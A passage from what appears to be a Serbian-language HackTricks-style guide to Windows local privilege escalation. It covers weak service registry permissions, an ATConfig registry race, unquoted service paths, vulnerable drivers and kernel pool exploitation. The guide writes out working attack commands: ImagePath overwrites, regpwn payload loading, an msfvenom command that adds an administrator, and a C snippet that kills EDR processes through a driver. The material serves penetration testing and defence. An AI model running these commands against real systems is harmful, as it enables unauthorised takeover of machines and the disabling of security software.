reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Originalni test dozvola glasio je:

Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako ih imaju, binarna datoteka koju servis izvršava može da se izmeni.

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za pisanje u registru na određenom ključu servisa. Sama ACL stavka ne dokazuje da je pristup efektivno dozvoljen: važno je uzeti u obzir stavke za zabranu, trenutni token i nasleđene dozvole. Prava nad ključem registra odvojena su od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad objektom servisa. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije servisa, način da se servis pokrene i identitet servisa sa većim privilegijama. Pogledajte Microsoftove reference o [pravima nad ključem registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [pravima pristupa servisu](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju binarne datoteke koju servis izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa simboličkom vezom u registru za upis proizvoljne HKLM vrednosti (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju ključeve **ATConfig** za svakog korisnika, koje proces sa privilegijama **SYSTEM** kasnije kopira u HKLM ključ sesije. Trka sa **simboličkom vezom** u registru može da preusmeri taj privilegovani upis na **bilo koju putanju u HKLM**, čime se dobija mogućnost **upisa proizvoljne vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja/prelaza na bezbednu radnu površinu i korisnik može da ga menja.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Popunite vrednost **HKCU ATConfig** koju želite da upiše SYSTEM.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće tok AT brokera.
3. **Dobijte trku** postavljanjem **oplock**-a na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite ključ **HKLM Session ATConfig** vezom u registru ka zaštićenom odredišnom ključu HKLM.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu putanju HKLM.

Kada dobijete mogućnost upisa proizvoljne HKLM vrednosti, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** kao deo trke.

Primer alata (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory nad registrom servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podregistre unutar njega**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Putanje do servisa bez navodnika

Ako putanja do izvršne datoteke nije unutar navodnika, Windows će pokušati da izvrši svaki deo putanje koji se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Navedite sve putanje servisa bez navodnika, izuzimajući one koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete da otkrijete i iskoristite** pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Binarni fajl servisa možete ručno da napravite pomoću metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se preduzeti ako usluga otkaže. Ova funkcija može da se podesi tako da upućuje na binarnu datoteku. Ako je tu binarnu datoteku moguće zameniti, možda je moguće eskalirati privilegije. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljne skripte zakazanih zadataka

Za omogućeni zadatak koji pokreće `cmd.exe /c` sa `.bat` ili `.cmd` datotekom, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell komande `-File`, proverite i ACL te navedene skripte; promenljive, uslovne naredbe i ulančavanje komandi u shell-u zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje ukazuju na mogućnost izvršavanja između naloga samo ako se principal konfigurisanog zadatka razlikuje od pozivaoca i ako zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje sadržaja može biti važan za skripte, ali ranija naredba `exit` ili druga kontrola toka mogu učiniti naknadno dodate linije nedostižnim. Potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija pre nego što tvrdite da je moguća eskalacija. Inventarisanje ne bi smelo da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u dostupnim datotekama

Na NTFS-u, čitljiva datoteka može da sadrži imenovani `:$DATA` tok čiji sadržaj nije prikazan običnim izlistavanjem direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **imena i veličine** tokova pre nego što otvorite njihov sadržaj; Windows ih izlaže preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) i PowerShell komande [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ime toka koje nagoveštava da sadrži tajnu samo je trag. Proverite efektivni pristup datoteci za čitanje, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i sa kojim nalogom se oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog nabrajanja.

## Ulazi pomoćnog programa Windows Driver Kit koji pokreću zakazani zadaci

Opcioni Windows Driver Kit uključuje `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektni fajl `working\rsf.rsf` iz svog radnog direktorijuma. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom može da pretvori pristup za upisivanje sa niskim privilegijama u ove ulaze u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka zaštićena. Potvrdite da privilegovani proces koristi te datoteke i da je moguće kreirati ili izmeniti **obe** prateće datoteke; samo pronalaženje pomoćnog programa nije dovoljno.

Kod zakazanog zadatka, pregledajte [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove radnje i ACL-ove putanja do dve prateće datoteke. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke je samo trag koji treba proveriti, a ne dokaz o tome odakle zadatak čita svoje ulaze. Mora biti ispunjen i preduslov za projektni radni fajl. Proverite stvarni principal zadatka umesto da pretpostavite da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Checkmk Windows agenta

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Checkmk Windows agente koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisivanja kada zamena ne bi uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite pun nivo zakrpe instalirane verzije i da li se može pokrenuti operacija agenta na koju se problem odnosi; sama oznaka grane, kao što je `2.1`, ne može da utvrdi izloženost. Enumeracija može da proveri verziju, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja agentskih komandi.

#### Pregled SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) uticao je na ADSelfService Plus build 6210 i starije; dobavljač ga je ispravio u buildu 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Unos instaliranog proizvoda ili putanja servisa zato predstavlja trag, a ne potvrdu ranjivosti: potvrdite tačan build, istoriju SAML konfiguracije, mrežnu dostupnost servisa i nalog pod kojim se izvršava. Izvršavanje koda kroz servis nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu koja radi kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda zaseban je trag šifrovane rezervne kopije, a ne dokaz da sadrži upotrebljive akreditive ili da postoji ova SAML ranjivost. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, bez raspakivanja.

#### Granice Jenkins kontrolera i domenskih naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže dodatni način pokretanja builda, ali potvrdite da je omogućen i da se build zaista izvršava. Izvršavanje se odvija pod identitetom kontrolera ili izabranog agenta, a sačuvani akreditivi mogu da se koriste samo ako posao ima pristup njihovom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva materijal akreditiva i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkinsovo skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njихово присуство само по себи не открива лозинку; проверите **приступ читања потребним датотекама** и одвојен пут поновне употребе налога, без исписивања тајни у заједнички излаз. Ако тај налог има право уписа у атрибут `scriptPath` AD корисничког објекта, потврдите да је путања скрипте уписива и да постоји стварна пријава или заказани потрошач који се извршава као циљни корисник, пре него што то сматрате извршавањем као други корисник. За даљу контролу групе потребно је засебно проверити ефективна AD права.

#### Идентитет self-hosted агента Azure Pipelines

За пројекат Azure DevOps Server или Azure Pipelines раздвојте дозволу за **креирање или уређивање** pipeline-а од дозволе за његово **стављање у ред** и коришћење изабраног пула агената; [Microsoft засебно документује дозволе за pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) и [овлашћивање пула](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ако налог са нижим привилегијама може да пошаље корак скрипте и покрене тај pipeline на self-hosted Windows агенту, корак се извршава као [конфигурисани налог оперативног система агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Пре него што тврдите да постоји прелазак између корисника или на SYSTEM, проверите тачан pipeline, ограничења гране и ресурса, овлашћени пул, покретљив job и идентитет сервиса агента. Инсталирани агент, улога у пројекту или право уписа у репозиторијум сами по себи су само трагови; током пасивне енумерације прегледајте дозволе и локалне метаподатке сервиса, без покретања build-а.

#### Акредитиви Microsoft Entra Connect Sync

[Microsoft разликује](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync сервисни налог**, који покреће сервис за синхронизацију и приступа његовој SQL бази података, од **налога AD DS конектора**, чије дозволе у директоријуму зависе од конфигурисаних функција синхронизације. Акредитиви конектора чувају се шифровани у тој бази података, а материјал кључа је [заштићен помоћу DPAPI под ADSync сервисним налогом](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Инсталирани сервис за синхронизацију, група чији назив наговештава локалне администраторске привилегије или сам приступ бази података не доказују да се акредитиви могу дешифровати нити да је могућа ескалација до домена. Засебно проверите стварна права читања базе података, приступ сервисног налога и кључа, распоред инсталације и SQL-а, конфигурисани идентитет конектора и његове ефективне AD привилегије. Рутинска енумерација треба да приказује само метаподатке сервиса и приступа, а не да поставља упите за сачуване тајне нити да их исписује.

#### Дозволе за DLL-ове за подршку управљачких програма штампача

Инсталирани управљачки програм штампача може да чува DLL-ове за подршку у `C:\ProgramData` и да их учитава у привилегованијем процесу за штампање. Проверите ACL-ове тачног директоријума управљачког програма и DLL-ова, укључујући надређене директоријуме и reparse points, чак и ако је WMI енумерација штампача забрањена. За [проблем са Ricoh управљачким програмом штампача CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), наведена путања била је `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [првобитно објављивање](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описује учитавање DLL-ова помоћу `PrintIsolationHost.exe`. ACL који дозвољава упис само је траг: проверите ефективан приступ упису након примене одбијајућих уноса, да ли је одговарајући управљачки програм инсталиран и учитава ли датотеку под привилегованим идентитетом, као и да ли су ажурирани управљачки програм или безбедносни програм добavljaча исправили инсталацију. Не закључујте да постоји рањивост само на основу назива директоријума или верзије управљачког програма.

### Dozvole za pisanje

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku ili da izmenite binarnu datoteku koju će izvršiti nalog Administratora (schedtasks).

Slabe dozvole za fascikle/datoteke u sistemu možete pronaći ovako:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ automatski učitava sve plugin DLL-ove u svojim podfolderima `plugins`. Ako postoji prenosiva instalacija ili kopija u koju može da se upisuje, ubacivanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući i iz `DllMain` i callback funkcija plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri pokretanju sistema

**Proverite da li možete da prepišete neki registar ili binarnu datoteku koju će pokrenuti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autoruns lokacijama za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **čudne ili ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže primitivu za proizvoljno čitanje/upis u kernel (često kod loše dizajniranih IOCTL handlera), možete eskalirati privilegije tako što ćete direktno ukrasti SYSTEM token iz memorije kernela.<sup>[[13]](#references)</sup> Pogledajte tehniku korak po korak ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Povezani materijali o Windows kernel exploitation-u:

Za slučaj kernel-mode ring-buffer-a sa registrima za čitanje/upis koje može menjati korisnik, pogledajte [USB MIDI looped-streaming varijantu](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod race-condition grešaka u kojima ranjivi poziv otvara putanju Object Manager-a koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF-ovi u cancel-safe queue-u, otkrivanje podataka iz paged-pool-a i I/O ring pivot-i

Neki Windows kernel LPE lanci mogu se izgraditi kombinovanjem dve pojedinačno slabe greške: **race condition-a u životnom ciklusu cancel-safe queue-a** koji oslobađa zahtev/CBD dok je zaključavanje reda i dalje aktivno, i otkrivanja podataka usled **oslobađanja zaključavanja pre kopiranja**, koje otkriva oslobođenu alokaciju iz paged-pool-a tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Napomene za audit i exploitation:

- **Oslobađanje pod zaključavanjem + naknadno otkazivanje**: potražite putanju uspeha koja obavlja **Acquire -> CompleteRequest/free -> Release**, dok putanja otkazivanja obavlja **Acquire -> RemoveIo(zastareli pokazivač) -> Release -> CompleteCanceledIo**. Ako putanja uspeha dođe do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre nego što oslobodi CBDQ/CSQ zaključavanje, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije nastaviti i proslediti oslobođeni `PFLT_CALLBACK_DATA` nazad driver-ovom callback-u za uklanjanje.
- **Ponovo iskoristite oslobođeni queue objekat** pomoću alokacije iz paged-pool-a iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se sadržaj i veličina mogu kontrolisati, a kasnije ih možete ispitati operacijama pipe read/peek. Ako oslobođeni objekat sadrži linkove liste, prepišite ih **cikličnom listom lažnih request čvorova u korisničkoj memoriji** tako da driver više puta obrađuje strukture zahteva koje definiše napadač, umesto da se zaustavi na početnoj glavi liste.
- **Nadogradite predvidiv upis**: ako lažni zahtev preusmeri ugnježdeni context pokazivač koji koriste upisi za vođenje evidencije (vremenske oznake / QPC / polja pored refcount-a), možda ćete dobiti upis u kernel čiju adresu možete kontrolisati, ali ne i vrednost. U tom slučaju ciljajte polje **length/size** objekta iz sprayed pool-a umesto završnog code/data pokazivača, a zatim prođite kroz spray dok oštećeni objekat ne omogući **čitanje van opsega iz paged-pool-a**.
- **Obrazac otkrivanja podataka podložan race condition-u**: svaki syscall koji obavlja `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se poboljšava ako napadač može da poveća kopirani bafer (na primer, dodavanjem mnogo stavki liste/resursa koje povećavaju konačnu veličinu alokacije serializer-a), jer duže kopiranje proširuje vremenski prozor za zamenu, a da pritom ne mora nužno da sruši sistem.
- **Ciljevi za dopunu bogati pokazivačima**: Windows **I/O ring** nizovi registrovanih bafera odlične su mete za otkrivanje podataka jer je njihova veličina u paged-pool-u pod kontrolom napadača (`8 * regBufferCnt`), a svaki element je kernel pokazivač na `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim oštetite **`RegBuffers`** i **`RegBuffersCount`** tako da naredne I/O ring operacije koriste falsifikovane stavke i omoguće proizvoljno čitanje/upis u kernel. Ako jedini dostupan upis daje stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće neporavnate upise** da napravite korisnički pokazivač ponovljenog bajta, kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i smestite tamo falsifikovani niz registrovanih bafera.<sup>[[30]](#references)</sup>

Korisni indikatori za debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada dobijete proizvoljno kernel čitanje/upisivanje pomoću oštećenog I/O ring-a, ukradite SYSTEM token koristeći standardni postupak nakon dobijanja primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive za oštećenje memorije košnice registra

Savremene ranjivosti košnica omogućavaju pripremu determinističkih rasporeda, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje oštećenja metapodataka u prelivanja kernel paged-pool-a bez prilagođenog drajvera. Ceo lanac objašnjen je ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Zabuna tipova u direktnom režimu `RtlQueryRegistryValues` zbog putanja pod kontrolom napadača

Neki drajveri prihvataju putanju registra iz korisničkog prostora, proveravaju samo da li je ispravna UTF-16 niska, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i prosleđuju pokazivač na skalarni podatak na steku, kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registra, a ne tipu koji je programer očekivao.

Ovo omogućava dve korisne primitive:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zabuna uloga / oracle**: apsolutna putanja `\Registry\...` pod kontrolom korisnika omogućava drajveru da upituje ključeve koje je izabrao napadač, otkrije njihovo postojanje preko povratnih kodova/zapisa i ponekad pročita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Oštećenje kernel memorije**: odredište za skalarni podatak, kao što je `&readValue`, može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti registra.

Napomene za praktičnu eksploataciju:

- **Ublažavanje u Windows 8+**: ako upit dohvati **nepouzdanu košnicu** koristeći `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, pozivi iz kernela uzrokuju rušenje `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, potražite **ključeve u pouzdanim sistemskim košnicama u koje napadač može da upisuje**, umesto da pripremate vrednosti u okviru `HKCU`.
- **Priprema u pouzdanoj košnici**: koristite NtObjectManager za popis upisivih potomaka putanje `\Registry\Machine`, a zatim ponovite skeniranje sa dupliranim tokenom **niskog integriteta**, da biste pronašli ključeve dostupne iz sandboxovanih konteksta:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u `int` od 4 bajta oštećuje susedne podatke na steku i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` koji kontroliše napadač u skalarni podatak na steku, a zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo upotrebljenoj skalarnoj promenljivoj, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova na steku. To je često najjednostavniji način da se u potpunosti prepiše pokazivač na callback.

Obrazac koji vredi tražiti: **heterogena čitanja iz registra u istu promenljivu na steku bez ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo upotrebljene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će doći do drugog čitanja.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + EDR kill)

Neki potpisani drajveri trećih strana kreiraju objekat uređaja sa jakim SDDL-om pomoću IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne primenjuje kada se uređaju pristupa putanjom koja sadrži dodatnu komponentu, što svakom neprivilegovanom korisniku omogućava da dobije handle korišćenjem putanje prostora imena kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, privilegovani IOCTL-ovi koje drajver izlaže mogu da se zloupotrebe za LPE i neovlašćene izmene. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell putem DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/pisanje sirovog diska (neovlašćene izmene van mreže, trikovi za postojanost pri pokretanju).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava gašenje AV/EDR-a iz korisničkog prostora putem kernela.

Minimalni obrazac PoC-a (korisnički režim):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Ublažavanje rizika za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proveravajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite prekidanje procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite modele posrednika umesto direktnih privilegija kernela.

Ideje za detekciju za branioce
- Pratite otvaranje sumnjivih naziva uređaja iz korisničkog režima (npr. \\ .\\amsdk*) i određene sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoftovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje unutar fascikle koja se nalazi na PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

